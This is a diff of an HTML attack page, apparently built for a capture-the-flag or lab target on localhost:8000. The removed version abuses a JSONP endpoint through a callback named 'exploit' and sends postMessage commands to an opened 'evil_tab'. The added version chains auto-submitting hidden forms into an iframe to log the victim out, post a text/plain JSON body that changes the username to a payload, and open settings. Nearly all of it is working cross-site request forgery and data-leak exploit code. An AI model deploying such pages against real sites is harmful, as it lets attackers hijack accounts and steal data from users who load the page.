@@ -1,46 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Redirect</title>
-</head>
 <body>
-<script>
-    function runSequence(tab, secretData) {
-        const targetOrigin = 'http://localhost:8000';
 
-        tab.postMessage({ action: 'FETCH', method: 'GET', path: '/#/sheets' }, targetOrigin);
+  <iframe name="worker" id="worker" src="http://localhost:8000/#/sheets"></iframe>
 
-        setTimeout(() => {
-            tab.postMessage({ action: 'FETCH', method: 'GET', path: '/api/logout' }, targetOrigin);
-        }, 1000);
+  <form id="f_logout" target="worker"
+        action="http://localhost:8000/api/logout"
+        method="GET">
+  </form>
 
-        setTimeout(() => {
-            tab.postMessage({
-                action: 'FETCH',
-                method: 'POST',
-                path: '/api/whoami',
-                payload: { data: secretData }
-            }, targetOrigin);
-        }, 1000);
+  <form id="f_whoami" target="worker"
+        action="http://localhost:8000/api/whoami"
+        method="POST"
+        enctype="text/plain">
+    <input name='{"new_username":"PAYLOAD' value='HERE"}'>
+  </form>
 
-        setTimeout(() => {
-            tab.postMessage({ action: 'FETCH', method: 'GET', path: '/#/settings' }, targetOrigin);
+  <form id="f_settings" target="worker"
+        action="http://localhost:8000/#/settings"
+        method="GET">
+  </form>
+
+  <script>
+    setTimeout(function() {
+      document.getElementById('f_logout').submit();
+
+      setTimeout(function() {
+        document.getElementById('f_whoami').submit();
+
+        setTimeout(function() {
+          document.getElementById('f_settings').submit();
         }, 2000);
-    }
-
-    function exploit(data) {
-        console.log("JSONP data:", data);
-
-        const svelteTab = window.open('http://localhost:8000', 'evil_tab');
-
-        setTimeout(() => {
-            console.log('Run Sequence...');
-            runSequence(svelteTab, data);
-        }, 3000);
-    }
+      }, 2000);
+    }, 3000);
   </script>
 
-  <!-- JSONP запрос -->
-  <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
 </body>
 </html>
